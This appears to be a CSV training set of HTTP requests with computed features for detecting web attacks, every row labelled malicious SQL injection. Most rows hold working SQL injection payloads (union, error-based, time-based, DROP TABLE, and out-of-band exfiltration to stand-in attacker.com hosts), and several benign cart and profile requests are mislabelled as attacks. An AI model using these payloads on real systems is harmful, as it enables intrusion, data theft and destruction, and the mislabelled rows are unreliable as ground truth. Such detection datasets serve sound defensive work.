RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
GET,/rest/products/search,query=%2527%2BUNION%2BSELECT%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2Buser%2528%2529%252C%2BNULL%252C%2BNULL%2523,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,320,21,122,0,1,78,22,19,10,0.1538,2,32,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%2527%2BUNION%2BSELECT%2BNULL%252C%2BNULL%252C%2Buser%2528%2529%252C%2BNULL%252C%2BNULL%252C%2BNULL%252C%2BNULL--,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,328,21,118,0,1,77,21,18,9,0.1511,2,33,False,False,False,False,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user5@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,363,8,0,64,2,25,17,0,0,0.2361,0,32,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/1,id=%27+AND+%27l%27%3D%27l%27+AND+WAITFOR+DELAY+%270%3A0%3A6%27%23,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,256,16,65,0,1,40,20,11,0,0.2469,0,33,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%2527%2BAND%2B%2528SELECT%2BUPDATEXML%25281%252CCONCAT%25280x7e%252C%2528current_user%2528%2529%2529%252C0x7e%2529%2529%2529%2523,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,363,21,136,0,1,93,22,18,15,0.1401,2,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/8,id=%2527%2BAND%2B%2528SELECT%2BLOAD_FILE%2528CONCAT%2528%2527%255C%255C%2527%252C%2528SELECT%2Buser%2528%2529%2529%252C%2527.exfil-248.attacker.com%255Cabc%2527%2529%2529%2529%252F%252A,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,377,16,185,0,1,130,33,26,22,0.1642,5,41,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+ANd+%28SELEcT+loAd_FILe%28cOncAT%28%27%5C%5C%27%2C%28Select+VERsiOn%28%29%29%2C%27.exFIL-549.aTTaCKeR.coM%5CAbc%27%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,392,21,135,0,1,89,33,22,0,0.2115,5,44,False,False,False,False,3,True,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/3,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,268,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
DELETE,/rest/cart/item/13,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,228,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,query=%2527%253B%2520%2544%2552%254f%2550%2520%2554%2541%2542%254c%2545%2520%2575%2573%2565%2572%2573%253b%252F%252A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,384,21,116,0,1,66,25,22,22,0.1825,0,29,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%2527%2BAND%2B%2528SELECT%2BUPDATEXML%25281%252CCONCAT%25280x7e%252C%2528database%2528%2529%2529%252C0x7e%2529%2529%2529%2523,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,384,21,128,0,1,89,21,18,15,0.1409,2,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/5,id=%27+AND+%28SELECT+UPDATEXML%281%2CCONCAT%280x7e%2C%28current_user%28%29%29%2C0x7e%29%29%29%23,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,300,16,96,0,1,63,22,15,0,0.1964,2,38,False,False,False,True,3,True,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/15,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125.1.63.162",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 1}",,malicious,sqli,319,18,0,15,1,0,9,0,0,0.2727,0,20,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,data=%2527%2520%2541%254e%2544%2520%2534%2537%253d%2536%2535%2520%2541%254e%2544%2520%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2520%2527%2530%253a%2530%253a%2536%2527%252f%252a,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,397,21,200,0,1,117,42,39,39,0.19,0,24,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+anD+%28SELEct+uPdateXml%281%2CcoNCaT%280X7E%2C%28daTAbaSE%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,335,21,90,0,1,59,21,14,0,0.1892,2,37,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/3,id=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-277.attacker.com%2F%27%7C%7Cversion%28%29%29--,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,289,16,98,0,1,69,22,13,0,0.193,0,45,False,False,False,True,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/9,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,260,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user3@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,346,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%2527%2520%2561%256e%2544%2520%2528%2573%2545%254c%2565%2563%2574%2520%254c%256f%2541%2564%255f%2546%2569%256c%2565%2528%2563%256f%256e%2543%2561%2574%2528%2527%255c%255c%2527%252c%2528%2553%2565%254c%2565%2563%2574%2520%2576%2545%2572%2573%2569%256f%254e%2528%2529%2529%252c%2527%252e%2565%2578%2546%2569%254c%252d%2537%2537%2530%252e%2561%2574%2554%2541%2543%256b%2565%2572%252e%2543%256f%254d%255c%2541%2542%2543%2527%2529%2529%2529%252f%252a,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,648,21,451,0,1,267,92,89,89,0.1949,0,28,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%22+AND+2%3D6%2F%2A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,282,21,21,0,1,11,9,4,0,0.2143,0,23,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/2,id=%27+AND+UTL_HTTP.REQUEST%28%27http%3A%2F%2Fexfil-445.attacker.com%2F%27%7C%7Cversion%28%29%29--,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,354,16,98,0,1,69,22,13,0,0.193,0,47,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/rest/cart/item/6,,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 5}",,malicious,sqli,266,17,0,15,1,0,9,0,0,0.2812,0,20,True,False,False,True,4,True,False,False,False,6,20,Tuesday
GET,/rest/products/search,query=%27+OR+%27d%27%3D%27d%27+,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,299,21,31,0,1,13,12,6,0,0.2308,0,23,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+AND+%27p%27%3D%27p%27+AND+SLEEP%285%29--,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,256,21,46,0,1,28,15,8,0,0.2239,2,30,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%22+AND+55%3D15%2F%2A,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,253,21,26,0,1,13,9,4,0,0.1915,0,23,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28user%28%29%29%2C0x7e%29%29%29--,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,327,21,90,0,1,59,20,14,0,0.1802,2,37,False,False,False,False,3,False,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/6,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,268,17,0,0,0,0,4,0,0,0.2353,0,10,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/7,id=%27+UNION+SELECT+NULL%2C+NULL%2C+version%28%29%2C+NULL%23,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,316,16,60,0,1,43,16,7,0,0.2105,2,30,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/2,id=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29%23,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,317,16,95,0,1,62,21,15,0,0.1892,2,37,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user2@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,308,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
PUT,/rest/cart/item/16,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:15,"{""quantity"": 4}",,malicious,sqli,306,18,0,15,1,0,9,0,0,0.2727,0,21,True,False,False,True,4,False,False,False,False,6,20,Tuesday
GET,/rest/products/search,term=%2527%2520%2541%254e%2544%2520%2527%2578%2527%253d%2527%2578%2527%2520%2541%254e%2544%2520%2553%254c%2545%2545%2550%2528%2533%2529%2523,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,383,21,140,0,1,81,30,27,27,0.1863,0,24,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%2527%2520%2541%254E%2544%2520%2554%2552%2555%2545%2520%2541%254E%2544%2520%2553%254C%2545%2545%2550%2528%2537%2529%2520,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,326,21,129,0,1,72,27,24,24,0.18,0,27,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,path=%27+ANd+%28SelECt+updateXmL%281%2CconcAT%280x7e%2C%28dAtABase%28%29%29%2C0X7e%29%29%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,341,21,97,0,1,60,22,16,0,0.1864,2,35,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/6,id=%27%3B+UPDatE+ORDERs+SeT+PrICE%3D%274739%27+WhERe+id%3D1%3B--,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,249,16,64,0,1,47,16,7,0,0.2,0,36,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,q=%27+OR+%27w%27%3D%27w%27%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,229,21,32,0,1,14,13,8,0,0.2453,0,25,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,query=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+version%28%29+,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,283,21,77,0,1,55,20,8,0,0.2041,2,33,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+OR+62%3D67+,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,279,21,18,0,1,11,8,2,0,0.2051,0,23,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/6' AND TRUE AND SLEEP(7)/*,,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,231,41,0,0,0,0,8,0,0,0.1951,2,27,False,False,False,False,4,False,False,False,False,4,20,Tuesday
GET,/rest/products/6,id=%27+AND+TRUE+AND+SLEEP%287%29%2F%2A,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,237,16,38,0,1,25,12,5,0,0.2222,2,30,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/10,id=%27%3B+DROP+TABLE+users%3B--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,224,17,31,0,1,22,9,3,0,0.1875,1,29,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,file=%2527%2BUNION%2BSELECT%2BNULL%252C%2Buser%2528%2529%252C%2BNULL%252C%2BNULL%252C%2BNULL%2B,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,345,21,95,0,1,60,18,15,7,0.1552,2,32,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%27+UNION+SELECT+user%28%29%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%2C+NULL%23,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,304,21,83,0,1,58,22,10,0,0.2115,2,30,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,category=%27+AND+%28SELECT+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28database%28%29%29%2C0x7e%29%29%29+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,349,21,99,0,1,62,21,14,0,0.175,2,38,False,False,False,False,3,True,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/16,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,261,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/1,id=%2527%2520%2541%254e%2544%2520%2527%2561%2527%253d%2527%2561%2527%2520%2541%254e%2544%2520%2557%2541%2549%2554%2546%254f%2552%2520%2544%2545%254c%2541%2559%2520%2527%2530%253a%2530%253a%2536%2527%252d%252d,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,393,16,208,0,1,123,44,41,41,0.1964,0,24,False,False,False,True,3,True,True,False,False,4,20,Tuesday
DELETE,/rest/cart/item/20,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,Content-Length:0,,,malicious,sqli,261,18,0,0,0,0,4,0,0,0.2222,0,11,False,False,False,True,4,False,False,False,False,5,20,Tuesday
GET,/rest/products/search,q=%27%3B+uPDATE+COnfig+Set+stAtUs%3D%27HACKeD_pw%27+where+iD%3D1%3B%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,310,21,73,0,1,53,19,9,0,0.2021,0,39,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/search,search=%27+UNION+SELECT+NULL%2C+NULL%2C+database%28%29%2C+NULL%2C+NULL%2C+NULL+,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,333,21,79,0,1,56,20,8,0,0.2,2,29,False,False,False,False,3,True,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user1@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,292,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
GET,/rest/products/9,id=%27+AND+%28SELECT+LOAD_FILE%28CONCAT%28%27%5C%5C%27%2C%28SELECT+user%28%29%29%2C%27.exfil-389.attacker.com%5Cabc%27%29%29%29+,HTTP/1.1,"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,367,16,128,0,1,85,32,20,0,0.2222,5,41,False,False,False,True,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,term=%27+anD+50%3D94+AnD+SLEEP%284%29%2F%2A,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,240,21,43,0,1,26,13,6,0,0.2031,2,32,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,data=%2527%2520%2541%254e%2544%2520%2528%2553%2545%254c%2545%2543%2554%2520%2555%2550%2544%2541%2554%2545%2558%254d%254c%2528%2531%252c%2543%254f%254e%2543%2541%2554%2528%2530%2578%2537%2565%252c%2528%2576%2565%2572%2573%2569%256f%256e%2528%2529%2529%252c%2530%2578%2537%2565%2529%2529%2529%2523,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,493,21,295,0,1,174,61,58,58,0.193,0,25,False,False,False,False,3,True,True,False,False,4,20,Tuesday
GET,/rest/products/search,id=%27+AND+43%3D94+AND+WAITFOR+DELAY+%270%3A0%3A4%27+,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,314,21,53,0,1,38,16,6,0,0.2162,0,34,False,False,False,False,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/8,id=%2527%2BAND%2B%2528SElEcT%2BlOad_FilE%2528CoNcat%2528%2527%255C%255C%2527%252C%2528SElecT%2BdAtABaSe%2528%2529%2529%252C%2527.EXFIL-119.aTtackEr.COm%255CaBC%2527%2529%2529%2529%252F%252A,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,445,16,189,0,1,134,33,26,22,0.161,5,39,False,False,False,True,3,False,True,False,False,4,20,Tuesday
GET,/rest/products/7,id=%27+AND+44%3D91%23,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,213,16,21,0,1,12,8,3,0,0.2162,0,23,False,False,False,True,3,False,True,False,False,4,20,Tuesday
PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user2@example.com"", ""address"": ""123 Main St""}",,malicious,sqli,345,8,0,64,2,25,17,0,0,0.2361,0,31,True,False,False,False,1,True,False,False,False,6,20,Tuesday
